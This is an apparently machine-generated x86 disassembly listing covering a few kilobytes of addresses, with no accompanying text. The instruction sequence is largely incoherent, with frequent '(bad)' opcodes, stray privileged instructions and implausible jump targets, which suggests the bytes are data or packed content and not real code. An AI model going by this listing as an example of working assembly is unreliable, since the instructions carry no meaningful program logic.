  432694:	mov    DWORD PTR [ebx+0x1ccc8b],ecx
  43269a:	inc    eax
  43269b:	dec    DWORD PTR [ecx-0x270375]
  4326a1:	add    BYTE PTR [ebx-0x39d72701],cl
  4326a7:	xchg   ecx,eax
  4326a8:	ret    
  4326a9:	add    BYTE PTR [ebp-0x830075],al
  4326af:	add    BYTE PTR [ebp-0x75],al
  4326b2:	mov    DWORD PTR [ebp+0x8ff0404],ecx
  4326b8:	lea    edi,[edi-0xc]
  4326bb:	add    bh,bh
  4326bd:	mov    edx,DWORD PTR [eax-0x7b]
  4326c0:	inc    ebp
  4326c1:	rdpmc  
  4326c3:	jne    0x4326c8
  4326c5:	add    BYTE PTR [eax-0x75],dl
  4326c8:	inc    ebp
  4326c9:	clc    
  4326ca:	add    eax,0x400009
  4326cf:	mov    DWORD PTR [ebx-0x7f000304],ecx
  4326d5:	mov    eax,DWORD PTR [ecx]
  4326d7:	in     al,dx
  4326d8:	add    dh,al
  4326da:	test   ebx,eax
  4326dc:	inc    BYTE PTR [ebp-0xff0001]
  4326e2:	add    BYTE PTR [ebp-0x43],al
  4326e5:	cmp    esi,0xfffffff8
  4326e8:	(bad)  
  4326e9:	push   DWORD PTR [eax]
  4326eb:	add    BYTE PTR [ebp-0x3a],dl
  4326ee:	test   ebx,eax
  4326f0:	je     0x432677
  4326f2:	mov    edi,edi
  4326f4:	sbb    al,0xff
  4326f6:	test   DWORD PTR gs:[eax],eax
  4326f9:	(bad)  
  4326fa:	js     0x4326fb
  4326fc:	add    BYTE PTR [ebx-0x39b20bdd],cl
  432702:	sub    eax,ebx
  432704:	mov    ecx,DWORD PTR [ebx-0x55130377]
  43270a:	add    eax,DWORD PTR [eax]
  43270c:	dec    ebp
  43270d:	push   eax
  43270e:	mov    al,BYTE PTR [ebp+0x1]
  432711:	mov    eax,DWORD PTR [ebp-0x68]
  432714:	mov    eax,DWORD PTR [eax]
  432716:	sbb    bh,al
  432718:	or     ah,dh
  43271a:	dec    ebp
  43271b:	inc    DWORD PTR [eax+0x4]
  43271e:	push   ecx
  43271f:	add    BYTE PTR [edx-0x1],dh
  432722:	mov    ecx,DWORD PTR [ecx+0x55cfe83c]
  432728:	or     DWORD PTR [ebx-0x7ff3400],0x8b5545d7
  432732:	add    ecx,DWORD PTR [ecx-0x1be77477]
  432738:	push   ecx
  432739:	cmp    BYTE PTR [ebx],al
  43273b:	inc    ebp
  43273c:	mov    DWORD PTR [ebx-0x7aaaafe4],ecx
  432742:	(bad)  
  432743:	(bad)  
  432744:	in     al,0xff
  432746:	add    BYTE PTR [ebp+0x0],al
  432749:	xor    eax,DWORD PTR [eax-0x7c76fffd]
  43274f:	add    al,bh
  432751:	(bad)  
  432752:	jmp    0x8d85:0x74b0558d
  432759:	dec    DWORD PTR [eax]
  43275b:	call   DWORD PTR [ebp-0x7b]
  43275e:	mov    edi,esi
  432760:	lock call DWORD PTR [ebp-0x75]
  432764:	mov    esi,esp
  432766:	mov    ah,0xc6
  432768:	mov    bh,0xc3
  43276a:	mov    DWORD PTR [ebx-0x110003c4],ecx
  432770:	add    DWORD PTR [eax],0x450050ff
  432776:	mov    DWORD PTR [ebx+0x9598cc],ecx
  43277c:	inc    edi
  43277e:	push   esp
  432780:	jmp    0xcd00:0x670481ff
  432787:	mov    DWORD PTR [ebx],esi
  432789:	clc    
  43278a:	cmp    edi,0xff9cff3b
  432790:	jne    0x43279a
  432792:	mov    eax,eax
  432794:	add    esi,DWORD PTR [eax]
  432796:	int3   
  432797:	inc    ebp
  432798:	cmp    al,0x83
  43279a:	add    BYTE PTR [eax],bl
  43279c:	adc    DWORD PTR [ebx+0x768b5055],eax
  4327a2:	add    ecx,DWORD PTR [ebx-0x30ba17c7]
  4327a8:	mov    edi,eax
  4327aa:	cmp    BYTE PTR [ebp+0x45],cl
  4327ad:	jmp    0x43273a
  4327af:	mov    ebx,DWORD PTR [esp+ebp*8]
  4327b2:	inc    ebp
  4327b3:	or     al,0x2
  4327b5:	dec    DWORD PTR [ebp+0x18]
  4327b8:	jne    0x43280f
  4327ba:	mov    ecx,DWORD PTR [eax+0x1c558bf8]
  4327c0:	mov    edi,DWORD PTR [ebx]
  4327c2:	in     al,0x50
  4327c4:	xchg   ecx,eax
  4327c5:	jmp    0x34376ca
  4327ca:	adc    al,0x8b
  4327cc:	inc    ebp
  4327cd:	mov    al,ds:0x8b04008b
  4327d2:	push   ebp
  4327d3:	sub    ecx,DWORD PTR [ecx-0x2d381318]
  4327d9:	push   ebp
  4327da:	test   DWORD PTR [ebx-0x2800d701],ecx
  4327e0:	inc    ebp
  4327e1:	dec    ebp
  4327e2:	mov    DWORD PTR [ecx+0x45ffb8f8],ecx
  4327e8:	mov    DWORD PTR [eax],0xe9ff00f4
  4327ee:	add    al,0x0
  4327f0:	add    BYTE PTR [eax],al
  4327f2:	mov    eax,edx
  4327f4:	push   eax
  4327f5:	rol    DWORD PTR [ebp-0xf0177],1
  4327fb:	bound  eax,QWORD PTR [ebp+0x50]
  4327fe:	xor    ecx,DWORD PTR [ecx+0x5589b403]
  432804:	add    BYTE PTR [ecx+0x558df0ff],cl
  43280a:	mov    al,0xf
  43280c:	test   DWORD PTR [edx],edx
  43280e:	call   DWORD PTR [ebp-0x7a0001]
  432814:	(bad)  
  432815:	loop   0x432816
  432817:	jnp    0xc6991c1d
  43281d:	mov    eax,ebx
  43281f:	cmp    al,0x8b
  432821:	(bad)  
  432822:	cld    
  432823:	shr    esi,0xc
  432826:	add    dl,al
  432828:	push   eax
  432829:	lea    eax,[ebp-0x1]
  43282c:	mov    edx,esi
  43282e:	cwde   
  43282f:	cli    
  432830:	add    BYTE PTR [ebp+0x1ffff8ff],al
  432836:	or     BYTE PTR [eax],cl
  432838:	inc    ebp
  432839:	dec    ebp
  43283a:	inc    DWORD PTR [ebx+0x74803914]
  432840:	add    DWORD PTR [ebx+0x451800],ecx
  432846:	call   DWORD PTR [eax+edx*1]
  432849:	add    ecx,DWORD PTR [ebp-0x34]
  43284c:	push   edi
  43284d:	adc    al,0x8
  43284f:	mov    edx,DWORD PTR [ebp-0x14]
  432852:	mov    ecx,DWORD PTR [ebp+0x18]
  432855:	add    DWORD PTR [ebp-0x4c],0xffffff8d
  432859:	inc    DWORD PTR [eax+esi*8]
  43285c:	inc    ebp
  43285d:	stos   BYTE PTR es:[edi],al
  43285e:	mov    edx,DWORD PTR [ebp-0x4]
  432861:	add    DWORD PTR [ebp-0x1c],eax
  432864:	mov    edx,DWORD PTR [ebp-0x70]
  432867:	cmp    eax,DWORD PTR [eax]
  432869:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43286a:	mov    eax,DWORD PTR [eax]
  43286c:	cld    
  43286d:	jae    0x4327ef
  43286f:	add    eax,DWORD PTR [ecx]
  432871:	clc    
  432872:	add    BYTE PTR [eax+0x30],dl
  432875:	mov    DWORD PTR [ecx],esi
  432877:	clc    
  432878:	pop    ds
  432879:	inc    ebp
  43287a:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  432880:	(bad)  
  432881:	push   DWORD PTR [edi]
  432883:	mov    ecx,DWORD PTR [ebx+0x398503e8]
  432889:	(bad)  
  43288a:	jae    0x43288b
  43288c:	mov    eax,DWORD PTR [ebp-0x740175]
  432892:	sub    eax,DWORD PTR [eax]
  432894:	add    eax,DWORD PTR [eax]
  432896:	mov    DWORD PTR [ecx+0x5f],eax
  432899:	mov    DWORD PTR [ebx-0x4],ebx
  43289c:	ret    0xff
  43289f:	mov    ecx,DWORD PTR [ebx+0x1cc683d8]
  4328a5:	ret    
  4328a6:	mov    eax,DWORD PTR [ebp-0x6f0075]
  4328ac:	add    BYTE PTR [ebp-0x7d],al
  4328af:	mov    DWORD PTR [eax],eax
  4328b1:	add    al,0x84
  4328b3:	inc    DWORD PTR [ecx]
  4328b5:	lea    eax,[eax]
  4328b7:	hlt    
  4328b8:	sar    bh,cl
  4328ba:	test   BYTE PTR [eax+0x1],dl
  4328bd:	inc    ebp
  4328be:	add    BYTE PTR [ebx],dh
  4328c0:	test   BYTE PTR [ebx],0x84
  4328c3:	push   eax
  4328c4:	add    BYTE PTR [ebp+0x0],al
  4328c7:	add    eax,0x86
  4328cc:	add    BYTE PTR [ebx-0x7f7b0340],cl
  4328d2:	add    BYTE PTR [ecx],al
  4328d4:	add    BYTE PTR [eax],al
  4328d6:	mov    esi,0x550030
  4328db:	mov    ecx,DWORD PTR [edi]
  4328dd:	cld    
  4328de:	fidiv  DWORD PTR [ebp+0x0]
  4328e1:	mov    edi,DWORD PTR [ecx]
  4328e3:	xor    BYTE PTR [eax+eax*1],0x84
  4328e7:	add    eax,DWORD PTR [eax]
  4328e9:	sbb    BYTE PTR [eax],al
  4328eb:	jne    0x43289e
  4328ed:	mov    eax,DWORD PTR [ecx]
  4328ef:	sbb    BYTE PTR [eax],al
  4328f1:	mov    DWORD PTR [ebp-0x1],esp
  4328f4:	add    BYTE PTR [eax+0x30e45ca],bh
  4328fa:	ret    0xb7fc
  4328fd:	dec    ebp
  4328fe:	or     al,0x89
  432900:	dec    ebp
  432901:	cld    
  432902:	cmovne ecx,DWORD PTR [eax-0x75]
  432906:	add    edi,esp
  432908:	seto   BYTE PTR [esi-0x72ffffff]
  43290f:	inc    ebp
  432910:	adc    al,0x8b
  432912:	mov    DWORD PTR [eax+ebp*8-0x740100],ecx
  432919:	cmp    DWORD PTR [edi+0x72],edx
  43291c:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  432922:	gs cmp al,0x0
  432925:	je     0x4328fd
  432927:	push   eax
  432928:	sar    BYTE PTR [eax],1
  43292a:	mov    bh,0x3e
  43292c:	push   cs
  43292d:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  432933:	add    DWORD PTR [ecx+0x12],ebp
  432936:	dec    edx
  432937:	(bad)  
  432938:	mov    eax,edx
  43293a:	in     al,dx
  43293b:	adc    DWORD PTR [ecx],esi
  43293d:	pop    esi
  43293e:	inc    ecx
  43293f:	leave  
  432940:	or     DWORD PTR [eax],ebx
  432942:	gs push ebp
  432944:	add    ah,ch
  432946:	into   
  432947:	in     al,dx
  432948:	enter  0xb756,0xf0
  43294c:	push   cs
  43294d:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  432957:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  43295d:	jnp    0x7443ae65
  432963:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  432969:	add    BYTE PTR [edi],cl
  43296b:	mov    edi,DWORD PTR [ecx-0x78]
  43296e:	ltr    WORD PTR [ecx-0x7b]
  432972:	dec    DWORD PTR [edi]
  432974:	clc    
  432975:	out    0x45,eax
  432977:	add    BYTE PTR [eax],cl
  432979:	cmp    ebx,0xffffff8c
  43297c:	jge    0x43297e
  43297e:	jb     0x432990
  432980:	je     0x522a00
  432986:	pop    edx
  432987:	push   esi
  432988:	mov    ecx,DWORD PTR [edi]
  43298a:	in     al,dx
  43298b:	rol    DWORD PTR [ebp+0x0],1
  43298e:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  432995:	cmp    DWORD PTR [ecx],0xfffffff0
  432998:	hlt    
  432999:	mov    esp,DWORD PTR [eax+0xf034d2b]
  43299f:	(bad)  
  4329a1:	push   eax
  4329a2:	jns    0xb8430e20
  4329a8:	lock push cs
  4329aa:	ror    edx,0x3
  4329ad:	test   BYTE PTR [ecx+0x5500e800],cl
  4329b3:	dec    eax
  4329b4:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  4329b8:	(bad)  
  4329b9:	mov    esi,0x7f33ff5f
  4329be:	inc    eax
  4329bf:	test   DWORD PTR [edx],eax
  4329c1:	je     0x432983
  4329c3:	mov    ecx,ecx
  4329c5:	adc    DWORD PTR [ebp-0xc],0xffffffec
  4329c9:	and    eax,DWORD PTR [eax+0xf0103]
  4329cf:	jp     0x4329bd
  4329d1:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  4329d5:	add    edx,DWORD PTR [edi+0x74]
  4329d8:	sbb    BYTE PTR [ebp+0x4d001484],cl
  4329de:	add    BYTE PTR [ebp-0x74c48bbb],al
  4329e4:	je     0x432969
  4329e6:	cmp    eax,edi
  4329e8:	js     0x432a0d
  4329ea:	add    eax,0xeb0fc003
  4329ef:	jns    0x43297c
  4329f1:	vmread DWORD PTR [ecx+0x45],ebx
  4329f5:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  4329fb:	adc    al,0x8b
  4329fd:	jge    0x432a13
  4329ff:	mov    edi,DWORD PTR [eax-0x4]
  432a02:	add    edi,DWORD PTR [edi]
  432a04:	or     bh,bh
  432a06:	push   ebp
  432a07:	push   es
  432a08:	mov    DWORD PTR [ebp-0x4],ebx
  432a0b:	add    edi,esi
  432a0d:	pop    es
  432a0e:	add    esi,DWORD PTR [edi-0x48ccf183]
  432a14:	mov    DWORD PTR [esp+esi*8],ecx
  432a17:	inc    ebp
  432a18:	pop    ebp
  432a19:	xor    DWORD PTR [esi-0x4],0x3b
  432a1d:	add    edx,DWORD PTR [ecx+edi*1]
  432a20:	push   es
  432a21:	clc    
  432a22:	mov    bh,0xdb
  432a24:	jp     0x4329dd
  432a26:	add    cl,BYTE PTR [esi]
  432a28:	div    DWORD PTR [edi+0x4d8b0c1c]
  432a2e:	test   edi,edi
  432a30:	je     0x432a26
  432a32:	mov    eax,ecx
  432a34:	or     BYTE PTR [ebx],al
  432a36:	dec    BYTE PTR [ecx+0x7d3bec7d]
  432a3c:	jbe    0x432ab0
  432a3e:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  432a44:	add    ecx,DWORD PTR [esi]
  432a46:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  432a4c:	add    eax,DWORD PTR [ebx-0x287af783]
  432a52:	je     0x432aa1
  432a54:	mov    DWORD PTR [ecx],edi
  432a56:	mov    esi,eax
  432a58:	hlt    
  432a59:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  432a60:	jb     0x432a22
  432a62:	jmp    0x432a4f
  432a64:	xor    esi,DWORD PTR [ebx]
  432a66:	pop    edi
  432a67:	pop    esi
  432a68:	pop    ebx
  432a69:	ret    
  432a6a:	ret    0x8b
  432a6d:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  432a73:	xor    DWORD PTR [esi],0xc
  432a76:	pushf  
  432a77:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  432a7d:	(bad)  
  432a7f:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  432a86:	dec    ebp
  432a87:	ret    
  432a88:	mov    edi,DWORD PTR [esi-0x4]
  432a8b:	pop    eax
  432a8c:	dec    ebp
  432a8d:	jne    0x432a1a
  432a8f:	xor    edi,esp
  432a91:	inc    eax
  432a92:	dec    ebp
  432a93:	jbe    0x432ae8
  432a95:	inc    eax
  432a96:	pop    ebp
  432a97:	add    edx,DWORD PTR [esi+0x8]
  432a9a:	push   ecx
  432a9b:	dec    eax
  432a9c:	push   ecx
  432a9d:	mov    eax,edi
  432a9f:	and    al,0xf0
  432aa1:	jo     0x432a8e
  432aa3:	mov    eax,DWORD PTR [ebx]
  432aa5:	sbb    BYTE PTR [ebp+0x4d],cl
  432aa8:	mov    eax,DWORD PTR [ebx]
  432aaa:	nop
  432aab:	or     BYTE PTR [eax],al
  432aad:	jne    0x432b06
  432aaf:	cmp    ebx,DWORD PTR [ecx+0x33893277]
  432ab5:	cld    
  432ab6:	xor    edi,edi
  432ab8:	add    edi,DWORD PTR [ebp+0x3]
  432abb:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  432ac1:	js     0x432a47
  432ac3:	jae    0x432ac7
  432ac5:	(bad)  
  432ac7:	xor    al,0x5d
  432ac9:	jmp    0x432a56
  432acb:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  432ad2:	fdecstp 
  432ad4:	test   BYTE PTR [edi],ah
  432ad6:	add    bh,BYTE PTR [ebp+0x0]
  432ad9:	add    ebx,DWORD PTR [ebp-0x77]
  432adc:	mov    edi,eax
  432ade:	cmp    al,0x0
  432ae1:	adc    dh,BYTE PTR [ebx]
  432ae3:	jge    0x432ae8
  432ae5:	mov    edi,DWORD PTR [ebx]
  432ae7:	jl     0x432af8
  432ae9:	clc    
  432aea:	dec    edi
  432aeb:	jge    0x432aed
  432aed:	mov    eax,DWORD PTR [ebx]
  432aef:	jb     0x432af9
  432af1:	mov    ecx,DWORD PTR [ebp-0x8]
  432af4:	mov    edi,edi
  432af6:	xor    edx,DWORD PTR [eax]
  432af8:	add    edi,DWORD PTR [ebx]
  432afa:	mov    DWORD PTR [ebp-0x10],edi
  432afd:	inc    edi
  432afe:	pop    ebp
  432aff:	jge    0x432b3c
  432b01:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  432b05:	mov    edx,0xc05d87f0
  432b0a:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  432b0e:	fimul  WORD PTR [eax]
  432b10:	fist   WORD PTR [ebp+0x1c]
  432b13:	in     al,dx
  432b14:	jne    0x432b02
  432b16:	mov    edi,DWORD PTR [edx-0x7a27a10]
  432b1c:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  432b20:	fdivp  st(0),st
  432b22:	fild   WORD PTR [ebp+0x4510f85c]
  432b28:	test   BYTE PTR [ebx+0x4d00fc02],cl
  432b2e:	inc    ebp
  432b2f:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  432b35:	mov    ebp,DWORD PTR [ebx-0x4]
  432b38:	adc    al,0x8b
  432b3a:	rcl    DWORD PTR [eax],0x48
  432b3d:	mov    esi,0x7080803
  432b42:	fiadd  WORD PTR [ebp+0x4d]
  432b45:	mov    WORD PTR [ebx+0x558bfc52],cs
  432b4b:	cld    
  432b4c:	xor    ebx,DWORD PTR [ebx+0x330103]
  432b52:	mov    DWORD PTR [edi+0x872dc],edi
  432b58:	xlat   BYTE PTR ds:[ebx]
  432b59:	into   
  432b5a:	ffreep st(6)
  432b5c:	retf   0x6c7
  432b5f:	iret   
  432b60:	dec    ebp
  432b61:	inc    ebp
  432b62:	mov    DWORD PTR [ebx],edi
  432b64:	fmul   QWORD PTR [edi]
  432b66:	dec    ebp
  432b67:	jnp    0x432b9c
  432b69:	add    BYTE PTR [ebx],al
  432b6b:	mov    ecx,DWORD PTR [esp+edi*8]
  432b6e:	inc    ebp
  432b6f:	dec    ebp
  432b70:	lea    esi,[ebx]
  432b72:	add    DWORD PTR [ebx],eax
  432b74:	jb     0x432bb1
  432b76:	add    BYTE PTR [edi],cl
  432b78:	inc    ebp
  432b79:	imul   eax,edi,0x858bd800
  432b7f:	cld    
  432b80:	clc    
  432b81:	mov    DWORD PTR [ebp+0x0],eax
  432b84:	inc    DWORD PTR [eax]
  432b86:	or     al,0xde
  432b88:	sbb    bh,0x1
  432b8b:	retf   
  432b8c:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  432b93:	dec    ebp
  432b94:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  432b9a:	enter  0x12de,0xdf
  432b9e:	inc    ebp
  432b9f:	pop    ebp
  432ba0:	dec    DWORD PTR [ebx-0x257f0ff4]
  432ba6:	add    DWORD PTR [edx],edx
  432ba8:	add    BYTE PTR [ebp+0x50],dl
  432bab:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  432bb1:	xor    esi,DWORD PTR [ecx-0x38c699fd]
  432bb7:	or     ah,al
  432bb9:	pop    ss
  432bba:	cdq    
  432bbb:	push   ebp
  432bbc:	clc    
  432bbd:	mov    eax,DWORD PTR [ebp-0x4]
  432bc0:	xor    edx,edx
  432bc2:	add    esi,DWORD PTR [ebx]
  432bc4:	cmp    eax,DWORD PTR [ebx]
  432bc6:	hlt    
  432bc7:	cmp    DWORD PTR [ebx],esp
  432bc9:	or     al,BYTE PTR [ebp+0xf]
  432bcc:	mov    eax,DWORD PTR [edx]
  432bce:	loopne 0x432bd0
  432bd0:	(bad)  
  432bd1:	mov    ecx,esi
  432bd3:	cld    
  432bd4:	pushf  
  432bd5:	pop    ebp
  432bd6:	cdq    
  432bd7:	mov    esi,DWORD PTR [edx]
  432bd9:	lock mov eax,eax
  432bdc:	adc    BYTE PTR [ebx],al
  432bde:	or     BYTE PTR [ebx+0x4d001001],0xcf
  432be5:	xor    ebp,DWORD PTR [edi+0x50e45189]
  432beb:	dec    ebp
  432bec:	mov    ecx,DWORD PTR [ebx-0x31390304]
  432bf2:	(bad)  
  432bf3:	iret   
  432bf4:	inc    ebp
  432bf5:	(bad)  
  432bf6:	jne    0x432c45
  432bf8:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  432bfe:	(bad)  
  432bff:	cmp    ebx,eax
  432c01:	je     0x432b89
  432c03:	add    edi,edi
  432c05:	or     bh,bh
  432c07:	dec    ebp
  432c08:	inc    ebp
  432c09:	mov    esi,DWORD PTR [ebx]
  432c0b:	cld    
  432c0c:	add    ecx,esi
  432c0e:	cmp    ecx,DWORD PTR [eax-0xc]
  432c11:	mov    edx,DWORD PTR [edi]
  432c13:	or     BYTE PTR [ebp-0x7c],al
  432c16:	mov    ebx,DWORD PTR [ecx-0x7639cd18]
  432c1c:	test   BYTE PTR [ecx+ebx*4],cl
  432c1f:	inc    ebp
  432c20:	xor    bh,BYTE PTR ds:0x8be89c89
  432c26:	out    dx,eax
  432c27:	adc    BYTE PTR [eax],al
  432c29:	jne    0x432bf2
  432c2b:	mov    ebp,esp
  432c2d:	fcomp  DWORD PTR [ebx]
  432c2f:	add    BYTE PTR [ecx],al
  432c31:	inc    DWORD PTR [ebp-0x75]
  432c34:	mov    esp,?
  432c36:	add    al,0xce
  432c38:	mov    ecx,edi
  432c3a:	cld    
  432c3b:	inc    ebp
  432c3c:	fidivr WORD PTR [ebx]
  432c3e:	fbstp  TBYTE PTR [ebp-0x3e]
  432c41:	mov    eax,DWORD PTR [eax]
  432c43:	adc    BYTE PTR [ebx-0x3974038b],cl
  432c49:	fadd   st,st(7)
  432c4b:	add    BYTE PTR [ebp-0x1],al
  432c4e:	mov    ecx,DWORD PTR [esp+edi*8]
  432c51:	inc    ebp
  432c52:	mov    bh,0xc7
  432c55:	loopne 0x432c9c
  432c57:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  432c5d:	add    DWORD PTR [ebx],esi
  432c5f:	pushf  
  432c60:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  432c66:	mov    eax,edi
  432c68:	cwde   
  432c69:	inc    ebp
  432c6a:	inc    ebp
  432c6b:	jne    0x432bf8
  432c6d:	mov    esp,esp
  432c6f:	clc    
  432c70:	add    al,0x4d
  432c72:	mov    DWORD PTR [ebx],esi
  432c74:	or     al,0x33
  432c76:	inc    ebp
  432c77:	lea    ecx,[ebx-0x398d13fd]
  432c7d:	add    bh,al
  432c7f:	inc    ebp
  432c80:	ror    DWORD PTR [ebx+0x45d829],0x8b
  432c87:	add    ebp,esp
  432c89:	shufps xmm1,xmm3,0xc7
  432c8d:	(bad)  
  432c8e:	jmp    0x748867b7
  432c93:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  432c99:	hlt    
  432c9a:	mov    ecx,DWORD PTR [edi]
  432c9c:	fadd   DWORD PTR [ebp+0x0]
  432c9f:	xor    ecx,DWORD PTR [edi]
  432ca1:	add    ecx,ecx
  432ca3:	cmp    edi,edi
  432ca5:	pmuludq mm7,QWORD PTR [edx+0x50]
  432ca9:	(bad)  
  432caa:	jmp    0x432c37
  432cac:	mov    edi,esp
  432cae:	or     al,0xc6
  432cb0:	inc    ebp
  432cb1:	(bad)  
  432cb2:	mov    eax,DWORD PTR [ebp+0x10]
  432cb5:	jne    0x432c40
  432cb7:	mov    eax,DWORD PTR [ecx]
  432cb9:	clc    
  432cba:	add    BYTE PTR [ebp-0x40],cl
  432cbd:	xor    edx,DWORD PTR [eax-0x73]
  432cc0:	jne    0x432cc3
  432cc2:	push   DWORD PTR [edx+0x8]
  432cc5:	add    BYTE PTR [ebp+0x45],al
  432cc8:	mov    ebp,ecx
  432cca:	cld    
  432ccb:	add    BYTE PTR [ebp+0x0],cl
  432cce:	xor    eax,DWORD PTR [ebp+0x3]
  432cd1:	mov    ?,WORD PTR [ebx]
  432cd3:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  432cd9:	sub    eax,0x5d330e4d
  432cde:	lea    esi,[ebx]
  432ce0:	add    DWORD PTR [ebx],eax
  432ce2:	jb     0x432ccd
  432ce4:	add    BYTE PTR [eax],al
  432ce6:	inc    ebp
  432ce7:	add    bl,ch
  432ce9:	inc    ebp
  432cea:	mov    esi,DWORD PTR [ebx]
  432cec:	or     al,0x3
  432cee:	(bad)  
  432cef:	mov    edi,eax
  432cf1:	in     al,dx
  432cf2:	scas   eax,DWORD PTR es:[edi]
  432cf3:	inc    ebp
  432cf4:	mov    esi,DWORD PTR [ebx]
  432cf6:	in     al,0x3
  432cf8:	add    al,0x89
  432cfa:	mov    ecx,DWORD PTR [eax+edi*8]
  432cfd:	dec    ebp
  432cfe:	(bad)  
  432cff:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3167]
  432d06:	mov    ecx,eax
  432d08:	cld    
  432d09:	push   es
  432d0a:	dec    ebp
  432d0b:	add    al,0x33
  432d0d:	mov    DWORD PTR [ebx],eax
  432d0f:	in     al,dx
  432d10:	cmp    DWORD PTR [ebp-0x67],eax
  432d13:	mov    eax,DWORD PTR [ebp-0xba0068]
  432d19:	mov    edx,DWORD PTR [ebp-0x4]
  432d1c:	mov    ecx,DWORD PTR [ebp-0x2c]
  432d1f:	xor    eax,DWORD PTR [ebp+0x3]
  432d22:	cmp    DWORD PTR [ebx],0x8b327498
  432d28:	xor    edi,esp
  432d2a:	jmp    0xff772a7c
  432d2f:	add    ecx,DWORD PTR [ebp-0x3f]
  432d32:	xor    ebx,DWORD PTR [edi]
  432d34:	add    eax,ecx
  432d36:	cmp    ebx,DWORD PTR [eax]
  432d38:	mov    ecx,DWORD PTR [ebp-0x4]
  432d3b:	mov    ecx,DWORD PTR [eax]
  432d3d:	adc    BYTE PTR [ebp-0x80],al
  432d40:	jmp    0x432d43
  432d42:	mov    eax,DWORD PTR [eax]
  432d44:	cld    
  432d45:	mov    bh,0xc6
  432d47:	push   ecx
  432d48:	(bad)  
  432d49:	jne    0x432da9
  432d4b:	dec    ecx
  432d4d:	or     BYTE PTR [ecx+ebx*1],cl
  432d50:	push   ebp
  432d51:	inc    ebp
  432d52:	in     al,dx
  432d53:	add    ebp,esp
  432d55:	or     bh,al
  432d57:	dec    ebp
  432d58:	cld    
  432d59:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  432d5f:	cmp    DWORD PTR [ecx],0x2
  432d62:	pushf  
  432d63:	dec    DWORD PTR [ebx+0x45510cf4]
  432d69:	mov    DWORD PTR [ebx+0x5145fc0c],ecx
  432d6f:	mov    edx,DWORD PTR [ecx+0xc]
  432d72:	xor    eax,esi
  432d74:	mov    edx,0xc172c7
  432d79:	inc    ebp
  432d7a:	mov    esi,DWORD PTR [ebp+0x8]
  432d7d:	mov    eax,edx
  432d7f:	call   0x84c7f474
  432d84:	add    DWORD PTR [ecx-0x76bace00],ebx
  432d8a:	mov    ebp,eax
  432d8c:	or     BYTE PTR [eax],dl
  432d8e:	jo     0x432ddd
  432d90:	push   edi
  432d91:	xor    esi,DWORD PTR [ebp+0x3]
  432d94:	(bad)  
  432d95:	pmulhuw mm0,mm1
  432d98:	test   DWORD PTR [ebp-0x8],ecx
  432d9b:	mov    DWORD PTR [ebp-0x67],eax
  432d9e:	mov    eax,DWORD PTR [ebp-0x4]
  432da1:	xor    edi,DWORD PTR [ebp-0x73]
  432da4:	xor    eax,DWORD PTR [ebx]
  432da6:	xor    esi,DWORD PTR [edx+0x3]
  432da9:	add    BYTE PTR [ecx],bh
  432dab:	inc    ebp
  432dac:	(bad)  
  432dad:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  432db3:	mov    DWORD PTR [eax],0x750f0004
  432db9:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  432dbf:	lock add BYTE PTR [ebp+0x0],cl
  432dc3:	mov    esi,DWORD PTR [ebp-0x18]
  432dc6:	mov    ebp,edx
  432dc8:	or     al,0x72
  432dca:	ja     0x432dcc
  432dcc:	mov    edx,esi
  432dce:	cld    
  432dcf:	(bad)  
  432dd2:	cli    
  432dd3:	mov    esi,DWORD PTR [ebp-0x4]
  432dd6:	cmp    ecx,esi
  432dd8:	bswap  edi
  432dda:	(bad)
  432dde:	mov    esi,DWORD PTR [ebp-0x4]
  432de1:	mov    esi,ecx
  432de3:	clc    
  432de4:	repnz add esi,DWORD PTR [ebp+0x45]
  432de8:	push   ebx
  432de9:	xor    eax,DWORD PTR [ebp+0x3]
  432dec:	cmp    ebx,DWORD PTR [edi-0x64]
  432def:	pop    ebx
  432df0:	jmp    0x432eb7
  432df5:	mov    esi,DWORD PTR [ebp-0x7d]
  432df8:	xor    ebp,DWORD PTR [eax]
  432dfa:	lea    eax,[ebp-0x8]
  432dfd:	ss repnz pushf 
  432e00:	out    dx,eax
  432e01:	(bad)  
  432e02:	neg    eax
  432e04:	ins    DWORD PTR es:[edi],dx
  432e05:	test   esi,edi
  432e07:	clc    
  432e08:	pop    esp
  432e09:	inc    ebp
  432e0a:	or     BYTE PTR [ecx+0x450f0c7d],cl
  432e10:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  432e16:	add    cl,al
  432e18:	jne    0x432db3
  432e1a:	mov    esi,DWORD PTR [edx]
  432e1c:	in     al,dx
  432e1d:	push   esi
  432e1e:	xor    BYTE PTR [ebp-0xe],dh
  432e21:	add    edi,esi
  432e23:	cmp    esi,DWORD PTR [edi+0xc21c10f]
